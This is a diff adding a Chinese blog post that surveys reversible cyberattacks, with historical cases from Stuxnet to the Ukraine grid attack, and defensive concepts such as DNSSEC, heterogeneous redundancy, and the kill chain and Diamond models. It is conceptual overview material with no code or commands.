+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>被攻击者对系统失去信心，误判导致将其视为沉没成本。</p>
+<h4 id="趋势"><a href="#趋势" class="headerlink" title="趋势"></a>趋势</h4><p>传统攻击中，瘫痪敌方设施的唯一途径是物理性摧毁。使用网络战，你能使之瘫痪，但冲突过后，设施能恢复运行。</p>
+<p>斯坦福大学的网络安全研究员Max Smeets表示：“战争行动就是棍棒加胡萝卜。虽然网络行动通常被认为可以惩罚或增加对手的成本，但是如果网络行动是可逆的，则可以增加“胡萝卜”效应，对一些敌人的可能行为做出奖励反应。 可逆性网络攻击类似于经济制裁，但更有效。</p>
+<p>可逆性网络攻击的概念类似于勒索软件，当犯罪分子将数据作为“人质”索取“赎金”。可逆攻击性网络攻击的一个例子是加密对手的数据以强制改变敌人行为，然后在达成协议后解密该信息。</p>
+<p>在未来，不可逆网络攻击可能会被解释为违反战争法规。</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="2010-年美以攻击伊朗核电站"><a href="#2010-年美以攻击伊朗核电站" class="headerlink" title="2010 年美以攻击伊朗核电站"></a>2010 年美以攻击伊朗核电站</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-3.png" alt="图-3"><br>通过U盘进入核电站内部网络的Stuxnet导致纳坦兹核设施大约五分之一离心机瘫痪。图中右侧显示器中的灰点表示离线的离心机，数量明显偏多。</p>
+<h3 id="2013-年伊朗黑客攻击纽约市鲍曼大坝控制系统"><a href="#2013-年伊朗黑客攻击纽约市鲍曼大坝控制系统" class="headerlink" title="2013 年伊朗黑客攻击纽约市鲍曼大坝控制系统"></a>2013 年伊朗黑客攻击纽约市鲍曼大坝控制系统</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-4.png" alt="图-4"></p>
+<p>鲍曼大坝位于纽约市以北不到20英里（合32公里）的地方，在2013年花费2百万美元修缮后，包含一个15英尺宽（1英尺=0.3048米），2.5英尺高的水闸，主要用于防洪，灌溉下游庄稼。</p>
+<p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-5.png" alt="图-5"></p>
+<p>2013年伊朗黑客利用Google搜索技巧确定了纽约市鲍曼大坝控制系统的系统漏洞。由于鲍曼大道水坝正在修复，在当时处于离网状态，任何尝试远程操纵的操作都会失败。伊朗黑客试图接管的举动还是引起了美国调查人员的不安。</p>
+<h3 id="2015-年俄罗斯攻击乌克兰电网"><a href="#2015-年俄罗斯攻击乌克兰电网" class="headerlink" title="2015 年俄罗斯攻击乌克兰电网"></a>2015 年俄罗斯攻击乌克兰电网</h3><p>2015年12月23日，乌克兰首都基辅部分地区和乌克兰西部的 140 万名居民断电数小时。电力系统是由发电、输电、变电、配电和用电连接成的统一整体，在整个电力系统中，几乎每个环节都依赖计算机技术的支撑，比如各级电网调度控制中心的计算机系统、变电站的计算机监控系统等。</p>
+<p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-6.png" alt="图-6"><br><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-7.png" alt="图-7"></p>
+<p>黑客通过邮件向电力公司员工发送了恶意的office文件，欺骗其下载了一款恶意软件“BlackEnergy”(黑暗力量)。该恶意软件最早可追溯到2007年，由俄罗斯地下黑客组织开发并广泛使用，包括用来“刺探”全球各国的电力公司。</p>
+<p>当天，黑客攻击了约60座变电站。黑客首先操作恶意软件将电力公司的主控电脑与变电站断连，随后又在系统中植入病毒，让电脑全体瘫痪。与此同时，黑客还对电力公司的电话通讯进行了干扰，导致受到停电影响的居民无法和电力公司进行联系。</p>
+<h3 id="2016-年俄罗斯操作美国总统大选"><a href="#2016-年俄罗斯操作美国总统大选" class="headerlink" title="2016 年俄罗斯操作美国总统大选"></a>2016 年俄罗斯操作美国总统大选</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-8.png" alt="图-8"></p>
+<p>俄罗斯黑客渗透进民主党全国委员会的电子邮件服务器，还入侵了希拉里·克林顿(Hillary Clinton)的竞选团队主席约翰·D·波德斯塔(John D. Podesta)的私人电子邮件帐户。</p>
+<p>没有证据表明来自俄罗斯或其他地方的黑客篡改了票数。俄罗斯“对选举采取黑客行动”，指的是某种比改变选票本身微妙得多的东西。</p>
+<p>告诉你什么是已知的东西，什么不是；还有什么是事实，什么是错误的理解。</p>
+<h3 id="2018-年沙特阿拉伯记者失踪事件"><a href="#2018-年沙特阿拉伯记者失踪事件" class="headerlink" title="2018 年沙特阿拉伯记者失踪事件"></a>2018 年沙特阿拉伯记者失踪事件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-9.png" alt="图-9"></p>
+<p>卡舒吉在10月2日进入沙特驻伊斯坦布尔领事馆之后失踪。土耳其官方声称，已经掌握了卡舒吉在领馆内被谋杀的视频和音频证据。</p>
+<h3 id="NSA历史事件"><a href="#NSA历史事件" class="headerlink" title="NSA历史事件"></a>NSA历史事件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-10.png" alt="图-10"></p>
+<h4 id="网络漏洞流入"><a href="#网络漏洞流入" class="headerlink" title="网络漏洞流入"></a>网络漏洞流入</h4><ul>
+<li>经济刺激，赏金计划；</li>
+<li>文化吸引，名人堂+感谢信；</li>
+</ul>
+<h4 id="网络漏洞流出"><a href="#网络漏洞流出" class="headerlink" title="网络漏洞流出"></a>网络漏洞流出</h4><p>瓦森纳协定（Wassenaar Arrangement，WA） 对漏洞、零日漏洞、入侵软件进行开发、测试、评估、产品化现在都受到了限制。如果没有获得许可就开始出口，有可能被视为非法行为。</p>
+<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><h3 id="攻击发起方式"><a href="#攻击发起方式" class="headerlink" title="攻击发起方式"></a>攻击发起方式</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-11.png" alt="图-11"></p>
+<h3 id="安全三要素"><a href="#安全三要素" class="headerlink" title="安全三要素"></a>安全三要素</h3><ul>
+<li><p>保密性(Confidentiality)<br>很多网络攻击都是从窃取或复制目标的个人信息开始的，包括各种各样的犯罪攻击活动，如信用卡欺诈、身份盗窃、或盗取比特币钱包。国家间谍也将保密性攻击作为其工作的重要部分，试图获取政治、军事或经济利益方面的机密信息</p>
+</li>
+<li><p>完整性(Integrity)<br>完整性攻击是为了破坏、损坏、摧毁信息或系统，以及依赖这些信息或系统的人。完整性攻击可以是小范围的篡改和破坏，也可以是大规模的对目标进行破坏。攻击者的范围可以从脚本小子到国家间谍组织。</p>
+</li>
+<li><p>可用性(Availability)<br>阻止目标访问数据是如今勒索软件和拒绝服务(DoS)攻击最常见的形式。勒索软件一般会加密目标设备的数据，并索要赎金进行解密。拒绝服务(DoS)攻击(通常以分布式拒绝服务攻击的形式)向目标发送大量的请求占用网络资源，使网络资源不可用。</p>
+</li>
+</ul>
+<h3 id="网络空间的三类威胁"><a href="#网络空间的三类威胁" class="headerlink" title="网络空间的三类威胁"></a>网络空间的三类威胁</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-12.png" alt="图-12"></p>
+<h4 id="探查、开采、利用"><a href="#探查、开采、利用" class="headerlink" title="探查、开采、利用"></a>探查、开采、利用</h4><p>从别人的网络中窃取信息，这是当前最普遍、最现实的威胁</p>
+<h4 id="中断、扰乱、否定"><a href="#中断、扰乱、否定" class="headerlink" title="中断、扰乱、否定"></a>中断、扰乱、否定</h4><p>通过僵尸网络、拒绝服务等手段，阻塞信道、占用服务器资源、毁坏数据和软件，使网络不能正常运转</p>
+<h4 id="摧毁、破坏、瘫痪"><a href="#摧毁、破坏、瘫痪" class="headerlink" title="摧毁、破坏、瘫痪"></a>摧毁、破坏、瘫痪</h4><p>典型的硬杀伤，通常会引起有形的物理毁坏、经济损失乃至人员伤亡。</p>
+<h3 id="网络空间四类可逆性攻击"><a href="#网络空间四类可逆性攻击" class="headerlink" title="网络空间四类可逆性攻击"></a>网络空间四类可逆性攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-13.png" alt="图-13"></p>
+<h4 id="锁定系统"><a href="#锁定系统" class="headerlink" title="锁定系统"></a>锁定系统</h4><p>使用仅由攻击者拥有的密钥加密来受害者的计算机操作系统以达到“锁定”效果</p>
+<h4 id="混淆数据"><a href="#混淆数据" class="headerlink" title="混淆数据:"></a>混淆数据:</h4><p>使用难以破译的算法或可逆的数据操作以混淆受害者的数据</p>
+<h4 id="拦截信息"><a href="#拦截信息" class="headerlink" title="拦截信息:"></a>拦截信息:</h4><p>拦截或扣留对受害者重要的关键信息，同时将其保存在备份中</p>
+<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务:"></a>拒绝服务:</h4><p>欺骗受害者使得他们认为系统实际上是不可操作的。</p>
+<h3 id="网络空间四大基础应用"><a href="#网络空间四大基础应用" class="headerlink" title="网络空间四大基础应用"></a>网络空间四大基础应用</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-14.png" alt="图-14"></p>
+<h3 id="APT攻击路径繁多载体多样"><a href="#APT攻击路径繁多载体多样" class="headerlink" title="APT攻击路径繁多载体多样"></a>APT攻击路径繁多载体多样</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-15.png" alt="图-15"></p>
+<h2 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h2><h3 id="根域名服务器"><a href="#根域名服务器" class="headerlink" title="根域名服务器"></a>根域名服务器</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-16.png" alt="图-16"></p>
+<p>根域名服务器是互联网域名解析系统（DNS）中最高级别的域名服务器，负责返回顶级域的权威域名服务器地址。所有的域名解析操作都离不开它们，它们是互联网基础设施中的重要部分。根域名服务器地址的数量被限制为13个。</p>
+<h3 id="域名解析服务安全性改进"><a href="#域名解析服务安全性改进" class="headerlink" title="域名解析服务安全性改进"></a>域名解析服务安全性改进</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-17.png" alt="图-17"></p>
+<p>DNS 安全扩展 (DNS Security Extensions, DNSSEC)</p>
+<p>通过对数据进行数字“签名”来抵御DNS劫持攻击，从而确信数据有效。</p>
+<p>为了从互联网中消除该攻击，必须在从根区域到最终域名（例如， <a href="http://www.h3c.com）的查找过程中的每一步部署该项技术。对根区域进行签名（在根区域部署" target="_blank" rel="noopener">www.h3c.com）的查找过程中的每一步部署该项技术。对根区域进行签名（在根区域部署</a> DNSSEC ）是整个过程中的必要步骤。</p>
+<p>该技术并不对数据进行加密，只是验证所访问的站点地址是否有效。</p>
+<p>2015年6月23日国际互联网名称与数字地址分配机构（ICANN）正式对外发布雪人计划 (Yeti DNS Project)。</p>
+<p>截至2017年11月27日，“雪人计划”已完成全球25台IPv6根服务器架设，其中中国部署4台。</p>
+<h3 id="关键基础设施"><a href="#关键基础设施" class="headerlink" title="关键基础设施"></a>关键基础设施</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-18.png" alt="图-18"></p>
+<h3 id="暴露在-Internet-上的工控设备"><a href="#暴露在-Internet-上的工控设备" class="headerlink" title="暴露在 Internet 上的工控设备"></a>暴露在 Internet 上的工控设备</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-19.png" alt="图-19"></p>
+<h3 id="基础设施脆弱点"><a href="#基础设施脆弱点" class="headerlink" title="基础设施脆弱点"></a>基础设施脆弱点</h3><h4 id="供应链"><a href="#供应链" class="headerlink" title="供应链"></a>供应链</h4><p>系统软硬件设备多种多样，来自系统内外、国内外的供应商，设备存在被预装恶意软件的风险，受攻击后，可能造成局部或系统性安全事故。</p>
+<h4 id="终端"><a href="#终端" class="headerlink" title="终端"></a>终端</h4><p>终端设备或系统的运营主体繁多、应用场景复杂，这都增加了其被恶意渗透或监听、控制的风险。</p>
+<h4 id="通信网络"><a href="#通信网络" class="headerlink" title="通信网络"></a>通信网络</h4><p>存在假冒终端、非授权人员非法接入、窃取信息的风险，导致通信网络设备运行异常或者中断。</p>
+<h4 id="应用系统"><a href="#应用系统" class="headerlink" title="应用系统"></a>应用系统</h4><p>存在恶意病毒入侵的可能，导致服务异常或中断，甚至破坏应用系统的软硬件设备。</p>
+<h3 id="异构冗余"><a href="#异构冗余" class="headerlink" title="异构冗余"></a>异构冗余</h3><p>控制芯片、精密的数控机床和工业控制器行业无法自主可控的使用异构冗余保证安全可靠。<br>这种“异构冗余”系统的实质就是：在一堆不可靠的部件之上，构建出一个相对可靠的体系。</p>
+<p>同一个生产流程，采用多套预备系统，分别采用不同国家的控制器，不同的操作系统、不同的软件逻辑。在这种情况下，机器的每一个动作都需要三套控制系统进行表决，如果有一套系统被攻击，给出异常的数据，那么它就会被表决踢出局。</p>
+<p>即使出现极端的情况：三个系统都遭到攻击，产生的结果全不一致，此时会自动调用备用系统。备用系统可以是一套隐藏系统，平时处于静默状态。攻击者根本感觉不到这套备用系统的存在，从而无法预先进行攻击。</p>
+<p>缺点: 投资巨大</p>
+<h3 id="可逆的-Satan-勒索软件"><a href="#可逆的-Satan-勒索软件" class="headerlink" title="可逆的 Satan 勒索软件"></a>可逆的 Satan 勒索软件</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-20.png" alt="图-20"></p>
+<h3 id="20-个重要管控"><a href="#20-个重要管控" class="headerlink" title="20 个重要管控"></a>20 个重要管控</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-21.png" alt="图-21"></p>
+<h3 id="攻击链模型"><a href="#攻击链模型" class="headerlink" title="攻击链模型"></a>攻击链模型</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-22.png" alt="图-22"></p>
+<h3 id="入侵分析钻石扩展模型"><a href="#入侵分析钻石扩展模型" class="headerlink" title="入侵分析钻石扩展模型"></a>入侵分析钻石扩展模型</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-23.png" alt="图-23"></p>
+<p>2013年塞尔吉奥 卡尔塔吉罗(Sergio Caltagirone）提出的入侵分析钻石模型</p>
+<h3 id="以受害者为中心的分析方法"><a href="#以受害者为中心的分析方法" class="headerlink" title="以受害者为中心的分析方法"></a>以受害者为中心的分析方法</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-24.png" alt="图-24"></p>
+<p>大多数组织，执行的网络上和主机内的检测和防御行为，属于以受害者为中心的方法。</p>
+<h3 id="使用攻击链与钻石模型复现分析攻击"><a href="#使用攻击链与钻石模型复现分析攻击" class="headerlink" title="使用攻击链与钻石模型复现分析攻击"></a>使用攻击链与钻石模型复现分析攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-25.png" alt="图-25"></p>
+<ol>
+<li>攻击者使用扫描技术发现一个受害者IP地址；</li>
+<li>攻击者向受害者IP地址投递攻击载荷；</li>
+<li>受害者设备触发攻击载荷；</li>
+<li>攻击载荷连接C&amp;C服务器；</li>
+<li>C&amp;C服务器下发指令；</li>
+<li>受害者设备被用于横向扫描;</li>
+<li>受害者设备被当做跳板肉鸡向外投递攻击载荷。</li>
+</ol>
+<h3 id="使用威胁指示器防御攻击"><a href="#使用威胁指示器防御攻击" class="headerlink" title="使用威胁指示器防御攻击"></a>使用威胁指示器防御攻击</h3><p><img src="/2018/10/28/%E5%8F%AF%E9%80%86%E6%80%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/%E5%9B%BE-26.png" alt="图-26"></p>
 
       
     </div>
@@ -825,7 +1435,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
